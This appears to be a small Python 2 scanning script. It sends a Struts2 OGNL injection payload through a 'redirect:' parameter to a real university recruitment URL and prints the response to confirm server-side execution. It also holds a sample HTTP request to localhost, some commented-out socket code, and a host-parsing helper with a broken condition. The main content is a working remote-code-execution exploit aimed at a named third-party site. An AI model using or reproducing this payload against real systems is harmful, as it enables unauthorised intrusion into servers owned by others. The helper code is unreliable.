#coding=utf-8
#from mycore import MyScanner
import os,sys,re,requests,socket
def get_host(req):
    host_reg = re.compile(r'Host:\s([a-z\.A-Z0-9]+)')
    host = host_reg.findall(req)
    print host
    if not host or host[0] != '':
        print host
        return host[0]

msg = '''GET /code/test.php HTTP/1.1
Host: 127.0.0.1
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.95 Safari/537.36 SE 2.X MetaSr 1.0
Referer: http://127.0.0.1/code/
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=bv2n8m904ggt8nsi9istnm9fg7

'''
url = "http://jy.bucm.edu.cn/recruit/mutual-selection!preview.action"
p = "redirect:${%23p%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23p.println(%22hacker%22),%23p.close()}"
url = "%s?%s" % (url,p)

r = requests.get(url)
print r.content


# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.settimeout(10)
# s.connect(("127.0.0.1",80))
# s.sendall(msg)
# reply = s.recv(65535)
# print reply.split('\r\n')[-1]

# ip = "http://www.baidu.com"
# ip = "http://127.0.0.1/code/test.php"
# ip = ip.replace("http://",'')

# if ip.find('/') != -1:
#     ip = ip[:ip.find('/')]

# print ip
# r = re.compile(r'')

